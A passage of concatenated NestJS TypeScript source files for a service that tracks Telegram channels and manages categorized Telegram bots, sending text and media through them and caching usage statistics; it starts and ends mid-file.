data = await this.promoteMsgsService.findOne();\n      return Object.keys(data || {});\n    } catch (error) {\n      throw this.handleError(error, 'Failed to fetch available messages');\n    }\n  }\n\n  private handleError(error: any, message: string): Error {\n    parseError(error, message);\n    if (error instanceof BadRequestException) {\n      return error;\n    }\n    return new InternalServerErrorException(`${message}: ${error.message}`);\n  }\n}","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// Export all DTOs\nexport * from './create-active-channel.dto';\nexport * from './update-active-channel.dto';\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\n\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\n","/**\n * Active Channels Module\n * @module active-channels\n */\n\nexport { ActiveChannelsController } from './active-channels.controller';\nexport { ActiveChannelsModule } from './active-channels.module';\nexport { ActiveChannelsService } from './active-channels.service';\n\n// Types & Models\nexport * from './dto';\nexport * from './schemas';\n\n// Re-export types for convenience\nexport type { ActiveChannel } from './schemas/active-channel.schema';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({\n  collection: 'activeChannels',\n  versionKey: false,\n  autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ default: null })\n  username: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: Number, default: 0 })\n  wordRestriction?: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: Number, default: 0 })\n  dMRestriction?: number;\n\n  @ApiProperty({ type: [String], default: defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs?: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned?: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  forbidden?: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted?: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  private?: boolean;\n\n  @ApiProperty({ type: Number, default: null })\n  @Prop({ type: Number, default: null })\n  lastMessageTime?: number;\n\n  @ApiProperty({ type: Number, default: null })\n  @Prop({ type: Number, default: null })\n  messageIndex?: number;\n\n  @ApiProperty({ type: Number, default: null })\n  @Prop({ type: Number, default: null })\n  messageId?: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  tempBan?: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: Number, default: 0 })\n  deletedCount?: number;\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","// Export all schemas\nexport * from './active-channel.schema';\n","import { Body, Controller, Delete, Get, Param, Patch, Post, Query } from '@nestjs/common';\nimport { ApiOperation, ApiResponse, ApiTags, ApiBody, ApiQuery, ApiParam } from '@nestjs/swagger';\nimport { BotsService } from './bots.service';\nimport { Bot } from './schemas/bot.schema';\nimport { ChannelCategory } from './bots.service';\n\n// Import DTOs\nimport { CreateBotDto } from './dto/create-bot.dto';\nimport { SendMessageDto } from './dto/send-message.dto';\nimport {\n  SendPhotoDto,\n  SendVideoDto,\n  SendAudioDto,\n  SendDocumentDto\n} from './dto/media.dto';\nimport {\n  SendVoiceDto,\n  SendAnimationDto,\n  SendStickerDto\n} from './dto/media-extras.dto';\nimport { SendMediaGroupDto } from './dto/media-group.dto';\n\n@ApiTags('Bots')\n@Controller('bots')\nexport class BotsController {\n  constructor(private readonly botsService: BotsService) {}\n\n  // Bot Management Endpoints\n  @Post()\n  @ApiOperation({\n    summary: 'Create a new bot',\n    description: 'Creates a new Telegram bot with the provided configuration. The bot will be registered in the system and can be used for message distribution.',\n  })\n  @ApiResponse({ status: 201, description: 'Bot has been successfully created' })\n  @ApiResponse({ status: 400, description: 'Invalid bot configuration provided' })\n  @ApiResponse({ status: 409, description: 'Bot with the same token already exists' })\n  @ApiBody({ type: CreateBotDto, description: 'Bot creation parameters including token and category' })\n  async createBot(@Body() createBotDto: CreateBotDto) {\n    return this.botsService.createBot(createBotDto);\n  }\n\n  @Get()\n  @ApiOperation({\n    summary: 'Get all bots or filter by category',\n    description: 'Retrieves a list of all registered bots. Can be filtered by category if provided.',\n  })\n  @ApiQuery({\n    name: 'category',\n    required: false,\n    description: 'Optional category filter to return only bots of a specific category',\n    enum: ChannelCategory\n  })\n  @ApiResponse({ status: 200, description: 'List of bots retrieved successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid category provided' })\n  async getBots(@Query('category') category?: ChannelCategory) {\n    return this.botsService.getBots(category);\n  }\n\n  @Get(':id')\n  @ApiOperation({\n    summary: 'Get a bot by ID',\n    description: 'Retrieves detailed information about a specific bot using its unique identifier.',\n  })\n  @ApiResponse({ status: 200, description: 'Bot details retrieved successfully' })\n  @ApiResponse({ status: 404, description: 'Bot not found' })\n  async getBotById(@Param('id') id: string) {\n    return this.botsService.getBotById(id);\n  }\n\n  @Patch(':id')\n  @ApiOperation({\n    summary: 'Update a bot',\n    description: 'Updates the configuration of an existing bot. Only provided fields will be modified.',\n  })\n  @ApiResponse({ status: 200, description: 'Bot updated successfully' })\n  @ApiResponse({ status: 404, description: 'Bot not found' })\n  @ApiResponse({ status: 400, description: 'Invalid update parameters' })\n  async updateBot(@Param('id') id: string, @Body() updateBotDto: Partial<Bot>) {\n    return this.botsService.updateBot(id, updateBotDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({\n    summary: 'Delete a bot',\n    description: 'Removes a bot from the system. This action cannot be undone.',\n  })\n  @ApiResponse({ status: 200, description: 'Bot successfully deleted' })\n  @ApiResponse({ status: 404, description: 'Bot not found' })\n  async deleteBot(@Param('id') id: string) {\n    return this.botsService.deleteBot(id);\n  }\n\n  // Message Sending Endpoints - By Category\n  @Post('category/:category/message')\n  @ApiOperation({\n    summary: 'Send a message using bots in a category',\n    description: 'Sends a text message using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the message',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendMessageDto,\n    description: 'Message content and optional formatting parameters'\n  })\n  @ApiResponse({ status: 200, description: 'Message sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid message parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendMessageByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendMessageDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n      return this.botsService.sendMessageByBotId(botId, data.message, data.options);\n    }\n    return this.botsService.sendMessageByCategory(category, data.message, data.options);\n  }\n\n  @Post('category/:category/photo')\n  @ApiOperation({\n    summary: 'Send a photo using bots in a category',\n    description: 'Sends a photo using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the photo',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendPhotoDto,\n    description: 'Photo content and optional caption parameters'\n  })\n  @ApiResponse({ status: 200, description: 'Photo sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid photo parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendPhotoByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendPhotoDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendPhotoByCategory(category, data.photo, data.options);\n  }\n\n  @Post('category/:category/video')\n  @ApiOperation({\n    summary: 'Send a video using bots in a category',\n    description: 'Sends a video using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the video',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendVideoDto,\n    description: 'Video content and optional caption parameters'\n  })\n  @ApiResponse({ status: 200, description: 'Video sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid video parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendVideoByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendVideoDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendVideoByCategory(category, data.video, data.options);\n  }\n\n  @Post('category/:category/audio')\n  @ApiOperation({\n    summary: 'Send audio using bots in a category',\n    description: 'Sends an audio file using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the audio',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendAudioDto,\n    description: 'Audio content and optional metadata parameters'\n  })\n  @ApiResponse({ status: 200, description: 'Audio sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid audio parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendAudioByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendAudioDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendAudioByCategory(category, data.audio, data.options);\n  }\n\n  @Post('category/:category/document')\n  @ApiOperation({\n    summary: 'Send a document using bots in a category',\n    description: 'Sends a document file using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the document',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendDocumentDto,\n    description: 'Document content and optional caption parameters'\n  })\n  @ApiResponse({ status: 200, description: 'Document sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid document parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendDocumentByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendDocumentDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendDocumentByCategory(category, data.document, data.options);\n  }\n\n  @Post('category/:category/voice')\n  @ApiOperation({\n    summary: 'Send a voice message using bots in a category',\n    description: 'Sends a voice message using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the voice message',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendVoiceDto,\n    description: 'Voice message content and optional parameters'\n  })\n  @ApiResponse({ status: 200, description: 'Voice message sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid voice message parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendVoiceByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendVoiceDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendVoiceByCategory(category, data.voice, data.options);\n  }\n\n  @Post('category/:category/animation')\n  @ApiOperation({\n    summary: 'Send an animation using bots in a category',\n    description: 'Sends an animation (GIF or short video) using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the animation',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendAnimationDto,\n    description: 'Animation content and optional caption parameters'\n  })\n  @ApiResponse({ status: 200, description: 'Animation sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid animation parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendAnimationByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendAnimationDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendAnimationByCategory(category, data.animation, data.options);\n  }\n\n  @Post('category/:category/sticker')\n  @ApiOperation({\n    summary: 'Send a sticker using bots in a category',\n    description: 'Sends a sticker using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the sticker',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendStickerDto,\n    description: 'Sticker file or sticker ID to send'\n  })\n  @ApiResponse({ status: 200, description: 'Sticker sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid sticker parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendStickerByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendStickerDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendStickerByCategory(category, data.sticker, data.options);\n  }\n\n  @Post('category/:category/media-group')\n  @ApiOperation({\n    summary: 'Send a media group using bots in a category',\n    description: 'Sends a group of media (photos and videos) as an album using either all bots in a category or a specific bot if botId is provided.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to use for sending the media group',\n    enum: ChannelCategory\n  })\n  @ApiQuery({\n    name: 'botId',\n    required: false,\n    description: 'Optional specific bot ID to use instead of all bots in the category'\n  })\n  @ApiBody({\n    type: SendMediaGroupDto,\n    description: 'Array of media items (photos/videos) to send as a group'\n  })\n  @ApiResponse({ status: 200, description: 'Media group sent successfully' })\n  @ApiResponse({ status: 400, description: 'Invalid media group parameters or bot category' })\n  @ApiResponse({ status: 404, description: 'Bot or category not found' })\n  async sendMediaGroupByCategory(\n    @Param('category') category: ChannelCategory,\n    @Query('botId') botId: string,\n    @Body() data: SendMediaGroupDto\n  ) {\n    if (botId) {\n      const bot = await this.botsService.getBotById(botId);\n      if (bot.category !== category) {\n        throw new Error(`Bot ${botId} does not belong to category ${category}`);\n      }\n    }\n    return this.botsService.sendMediaGroupByCategory(category, data.media, data.options);\n  }\n\n\n  // Statistics and Monitoring\n  @Get('category/:category/stats')\n  @ApiOperation({\n    summary: 'Get bot statistics by category',\n    description: 'Retrieves aggregated statistics for all bots in a specific category, including message counts and performance metrics.',\n  })\n  @ApiParam({\n    name: 'category',\n    description: 'Category of bots to get statistics for',\n    enum: ChannelCategory\n  })\n  @ApiResponse({ status: 200, description: 'Statistics retrieved successfully' })\n  @ApiResponse({ status: 404, description: 'Category not found' })\n  async getBotStats(@Param('category') category: ChannelCategory) {\n    return this.botsService.getBotStatsByCategory(category);\n  }\n\n}\n\n","import { Module, OnModuleInit } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BotsController } from './bots.controller';\nimport { BotsService } from './bots.service';\nimport { Bot, BotSchema } from './schemas/bot.schema';\nimport { setBotsServiceInstance } from '../../utils/bot.service.instance';\n\n@Module({\n  imports: [\n    MongooseModule.forFeature([{ name: Bot.name, schema: BotSchema }])\n  ],\n  controllers: [BotsController],\n  providers: [BotsService],\n  exports: [BotsService]\n})\nexport class BotsModule implements OnModuleInit {\n  constructor(private readonly botsService: BotsService) {}\n\n  onModuleInit() {\n    // Set the BotsService instance for global access\n    setBotsServiceInstance(this.botsService);\n  }\n}\n","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport axios, { all } from 'axios';\nimport FormData from 'form-data';\nimport NodeCache from 'node-cache';\nimport { parseError } from '../../utils';\nimport { Bot, BotDocument } from './schemas/bot.schema';\n\nexport enum ChannelCategory {\n    CLIENT_UPDATES = 'CLIENT_UPDATES',\n    USER_WARNINGS = 'USER_WARNINGS',\n    VC_WARNINGS = 'VC_WARNINGS',\n    USER_REQUESTS = 'USER_REQUESTS',\n    VC_NOTIFICATIONS = 'VC_NOTIFICATIONS',\n    CHANNEL_NOTIFICATIONS = 'CHANNEL_NOTIFICATIONS',\n    ACCOUNT_NOTIFICATIONS = 'ACCOUNT_NOTIFICATIONS',\n    ACCOUNT_LOGIN_FAILURES = 'ACCOUNT_LOGIN_FAILURES',\n    ACCOUNT_LOGINS = 'ACCOUNT_LOGINS',\n    PROMOTION_ACCOUNT = 'PROMOTION_ACCOUNT',\n    CLIENT_ACCOUNT = 'CLIENT_ACCOUNT',\n    PAYMENT_FAIL_QUERIES = 'PAYMENT_FAIL_QUERIES',\n    SAVED_MESSAGES = 'SAVED_MESSAGES',\n    HTTP_FAILURES = 'HTTP_FAILURES',\n    UNVDS = 'UNVDS',\n    PROM_LOGS1 = 'PROM_LOGS1',\n    PROM_LOGS2 = 'PROM_LOGS2',\n    UNAUTH_CALLS = 'UNAUTH_CALLS',\n}\n\nexport interface SendMessageOptions {\n    parseMode?: 'HTML' | 'MarkdownV2' | 'Markdown';\n    disableWebPagePreview?: boolean;\n    disableNotification?: boolean;\n    replyToMessageId?: number;\n    allowSendingWithoutReply?: boolean;\n    protectContent?: boolean;\n    linkPreviewOptions?: {\n        isDisabled?: boolean;\n        url?: string;\n        preferSmallMedia?: boolean;\n        preferLargeMedia?: boolean;\n        showAboveText?: boolean;\n    };\n}\n\nexport interface MediaOptions extends Omit<SendMessageOptions, 'disableWebPagePreview' | 'linkPreviewOptions'> {\n    caption?: string;\n    hasSpoiler?: boolean;\n}\n\nexport interface PhotoOptions extends MediaOptions { }\nexport interface VideoOptions extends MediaOptions {\n    duration?: number;\n    width?: number;\n    height?: number;\n    thumbnail?: Buffer | string;\n    supportsStreaming?: boolean;\n}\n\nexport interface AudioOptions extends MediaOptions {\n    duration?: number;\n    performer?: string;\n    title?: string;\n    thumbnail?: Buffer | string;\n}\n\nexport interface DocumentOptions extends MediaOptions {\n    thumbnail?: Buffer | string;\n    disableContentTypeDetection?: boolean;\n}\n\nexport interface VoiceOptions extends Omit<MediaOptions, 'caption'> {\n    duration?: number;\n}\n\nexport interface VideoNoteOptions extends Omit<MediaOptions, 'caption'> {\n    duration?: number;\n    length?: number;\n    thumbnail?: Buffer | string;\n}\n\nexport interface AnimationOptions extends MediaOptions {\n    duration?: number;\n    width?: number;\n    height?: number;\n    thumbnail?: Buffer | string;\n}\n\nexport interface StickerOptions extends Omit<MediaOptions, 'caption'> {\n    emoji?: string;\n}\n\nexport interface MediaGroupItem {\n    type: 'photo' | 'video' | 'audio' | 'document';\n    media: Buffer | string;\n    caption?: string;\n    parseMode?: 'HTML' | 'Markdown' | 'MarkdownV2';\n    hasSpoiler?: boolean;\n    extension?: string;\n    duration?: number;\n    width?: number;\n    height?: number;\n    supportsStreaming?: boolean;\n    performer?: string;\n    title?: string;\n    thumbnail?: Buffer;\n}\n\nexport interface MediaGroupOptions extends Omit<SendMessageOptions, 'parseMode' | 'disableWebPagePreview' | 'linkPreviewOptions'> { }\n\n@Injectable()\nexport class BotsService implements OnModuleInit {\n    private cache: NodeCache;\n    private readonly flushInterval = 300000; // 5 minutes in milliseconds\n    private readonly maxPendingUpdates = 100; // Max pending updates before forcing a flush\n\n    constructor(\n        @InjectModel(Bot.name) private botModel: Model<BotDocument>\n    ) {\n        // Initialize cache with a TTL of 5 minutes (300 seconds) and check period of 60 seconds\n        this.cache = new NodeCache({ stdTTL: 300, checkperiod: 60 });\n    }\n\n    async onModuleInit(): Promise<void> {\n        await this.initializeCache();\n        // Start periodic flush of pending stat updates\n        this.startPeriodicFlush();\n    }\n\n    private async initializeCache(): Promise<void> {\n        try {\n            const bots = await this.botModel.find().lean().exec();\n            const botsByCategory = bots.reduce((acc, bot) => {\n                if (!acc[bot.category]) {\n                    acc[bot.category] = [];\n                }\n                acc[bot.category].push(bot);\n                return acc;\n            }, {} as Record<ChannelCategory, BotDocument[]>);\n\n            // Cache bots by category and by ID\n            for (const category in botsByCategory) {\n                const sortedBots = botsByCategory[category as ChannelCategory].sort(\n                    (a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime()\n                );\n                this.cache.set(`category:${category}`, sortedBots);\n                sortedBots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));\n            }\n            console.log('Bot cache initialized with', Object.keys(botsByCategory).length, 'categories');\n        } catch (error) {\n            console.error('Failed to initialize bot cache:', error);\n        }\n    }\n\n    private startPeriodicFlush(): void {\n        setInterval(async () => {\n            await this.flushPendingStats();\n        }, this.flushInterval);\n    }\n\n    private async flushPendingStats(): Promise<void> {\n        const pendingUpdates = this.cache.get<Record<string, Partial<Bot['stats'] & { lastUsed?: Date }>>>('pendingStats') || {};\n        if (Object.keys(pendingUpdates).length === 0) {\n            return;\n        }\n\n        try {\n            const bulkOps = Object.entries(pendingUpdates).map(([botId, updates]) => ({\n                updateOne: {\n                    filter: { _id: botId },\n                    update: {\n                        $inc: {\n                            ...(updates.messagesSent ? { 'stats.messagesSent': updates.messagesSent } : {}),\n                            ...(updates.photosSent ? { 'stats.photosSent': updates.photosSent } : {}),\n                            ...(updates.videosSent ? { 'stats.videosSent': updates.videosSent } : {}),\n                            ...(updates.documentsSent ? { 'stats.documentsSent': updates.documentsSent } : {}),\n                            ...(updates.audiosSent ? { 'stats.audiosSent': updates.audiosSent } : {}),\n                            ...(updates.voicesSent ? { 'stats.voicesSent': updates.voicesSent } : {}),\n                            ...(updates.animationsSent ? { 'stats.animationsSent': updates.animationsSent } : {}),\n                            ...(updates.stickersSent ? { 'stats.stickersSent': updates.stickersSent } : {}),\n                            ...(updates.mediaGroupsSent ? { 'stats.mediaGroupsSent': updates.mediaGroupsSent } : {}),\n                        },\n                        ...(updates.lastUsed ? { $set: { lastUsed: updates.lastUsed } } : {}),\n                    },\n                },\n            }));\n\n            if (bulkOps.length > 0) {\n                await this.botModel.bulkWrite(bulkOps);\n                console.log(`Flushed ${bulkOps.length} pending stat updates to database`);\n            }\n\n            // Clear pending stats after flushing\n            this.cache.del('pendingStats');\n        } catch (error) {\n            console.error('Failed to flush pending stats:', error);\n        }\n    }\n\n    async createBot(createBotDto: {\n        token: string;\n        category: ChannelCategory;\n        channelId: string;\n        description?: string;\n    }): Promise<BotDocument> {\n        const username = await this.fetchUsername(createBotDto.token);\n        if (!username) {\n            throw new Error('Invalid bot token or unable to fetch bot username');\n        }\n\n        const existingBot = await this.botModel.findOne({ token: createBotDto.token }).exec();\n        if (existingBot) {\n            throw new Error('Bot with this token already exists');\n        }\n\n        const createdBot = new this.botModel({\n            ...createBotDto,\n            username,\n            lastUsed: new Date(),\n            stats: {\n                messagesSent: 0,\n                photosSent: 0,\n                videosSent: 0,\n                documentsSent: 0,\n                audiosSent: 0,\n                voicesSent: 0,\n                animationsSent: 0,\n                stickersSent: 0,\n                mediaGroupsSent: 0\n            }\n        });\n\n        const savedBot = await createdBot.save();\n        // Update caches\n        const cachedBots = this.cache.get<BotDocument[]>(`category:${createBotDto.category}`) || [];\n        cachedBots.push(savedBot.toObject());\n        this.cache.set(`category:${createBotDto.category}`, cachedBots.sort(\n            (a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime()\n        ));\n        this.cache.set(`bot:${savedBot._id}`, savedBot.toObject());\n        return savedBot;\n    }\n\n    async getBots(category?: ChannelCategory): Promise<BotDocument[]> {\n        if (category) {\n            const cachedBots = this.cache.get<BotDocument[]>(`category:${category}`);\n            if (cachedBots) {\n                return cachedBots;\n            }\n            console.warn(`Cache miss for category: ${category}`);\n            const bots = await this.botModel.find({ category }).lean().exec();\n            this.cache.set(`category:${category}`, bots);\n            bots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));\n            return bots;\n        }\n        // For all bots, aggregate from category caches if available\n        const allCategories = Object.values(ChannelCategory);\n        const allBots: BotDocument[] = [];\n        for (const cat of allCategories) {\n            const bots = this.cache.get<BotDocument[]>(`category:${cat}`) || [];\n            allBots.push(...bots);\n        }\n        if (allBots.length > 0) {\n            return allBots;\n        }\n        console.warn('Cache miss for all bots');\n        const bots = await this.botModel.find().lean().exec();\n        bots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));\n        const botsByCategory = bots.reduce((acc, bot) => {\n            if (!acc[bot.category]) acc[bot.category] = [];\n            acc[bot.category].push(bot);\n            return acc;\n        }, {} as Record<ChannelCategory, BotDocument[]>);\n        for (const category in botsByCategory) {\n            this.cache.set(`category:${category}`, botsByCategory[category as ChannelCategory]);\n        }\n        return bots;\n    }\n\n    async getBotById(id: string): Promise<BotDocument> {\n        const cachedBot = this.cache.get<BotDocument>(`bot:${id}`);\n        if (cachedBot) {\n            return cachedBot;\n        }\n        console.warn(`Cache miss for bot ID: ${id}`);\n        const bot = await this.botModel.findById(id).lean().exec();\n        if (!bot) {\n            throw new NotFoundException(`Bot with ID ${id} not found`);\n        }\n        this.cache.set(`bot:${id}`, bot);\n        const cachedBots = this.cache.get<BotDocument[]>(`category:${bot.category}`) || [];\n        if (!cachedBots.some(b => b._id.toString() === id)) {\n            cachedBots.push(bot);\n            this.cache.set(`category:${bot.category}`, cachedBots.sort(\n                (a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime()\n            ));\n        }\n        return bot;\n    }\n\n    async updateBot(id: string, updateBotDto: Partial<Bot>): Promise<BotDocument> {\n        const bot = await this.botModel\n            .findByIdAndUpdate(id, { ...updateBotDto, lastUsed: new Date() }, { new: true })\n            .lean()\n            .exec();\n        if (!bot) {\n            throw new NotFoundException(`Bot with ID ${id} not found`);\n        }\n        // Update caches\n        this.cache.set(`bot:${id}`, bot);\n        const cachedBots = this.cache.get<BotDocument[]>(`category:${bot.category}`) || [];\n        const updatedBots = cachedBots\n            .filter(b => b._id.toString() !== id)\n            .concat(bot)\n            .sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());\n        this.cache.set(`category:${bot.category}`, updatedBots);\n        return bot;\n    }\n\n    async deleteBot(id: string): Promise<void> {\n        const bot = await this.botModel.findById(id).lean().exec();\n        if (!bot) {\n            throw new NotFoundException(`Bot with ID ${id} not found`);\n        }\n        await this.botModel.findByIdAndDelete(id).exec();\n        // Update caches\n        this.cache.del(`bot:${id}`);\n        const cachedBots = this.cache.get<BotDocument[]>(`category:${bot.category}`) || [];\n        const updatedBots = cachedBots\n            .filter(b => b._id.toString() !== id)\n            .sort((a, b) => new 